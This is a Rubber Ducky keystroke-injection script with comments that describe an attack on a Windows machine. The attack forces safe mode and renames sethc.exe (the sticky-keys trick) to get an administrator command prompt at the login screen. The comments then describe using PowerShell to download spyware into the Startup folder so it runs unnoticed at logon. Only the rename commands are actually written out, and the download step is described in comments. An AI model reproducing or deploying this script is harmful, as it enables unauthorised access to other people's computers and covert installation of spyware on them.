REM RUBBER DUCKEY code to access cmd with admin privilages and downloading spyware
REM should check if the restart method also works with "cmd" instead of "System image recovery"
REM If suggestion works could save time and many lines of code

REM the only flaw so far is that I have to maually shut down and turn on instead of keyboard
REM Part 1: getting the cmd with admin privilages o login screen
REM Before I insert the rubber ducky, I shut down the computer and turn on again, but for 2 times I force shut 
REM down before the startup window finishes loading, On the third time I will have forced the computer to safe mode.
REM this is the part navigated in safe mode, where I insert the rubber ducky.

REM In the command Prompt, you need to find file sethc.exe in order to change it to cmd
REM The rubber ducky will search and try multiple dirves in order to change the file name
REM first, it will try C:

STRING C:
ENTER
DELAY 100
STRING ren C:/Windows/system32/sethc.exe C:/Windows/system32/sethc1.exe
ENTER
DELAY 200

REM in 99.9999999% of the time it will be enough
REM Now it will exit cmd and return to screen

REM there you go! cmd with admin access!
REM Next part is to open powershell, download the malware and copy it to a specific file that will auto run
REM as soon as the user logs on

REM There we have it! A full rubber ducky script that inkects an executable file with malicious code
REM and executes it when the user logs on
REM Best of all- user won't even know that he was hacked! It's all from login screen
REM NOTE!!! You will have to restart the computer in order for the directory StartUp will recognize the file 
REM as part of its automated tasks.
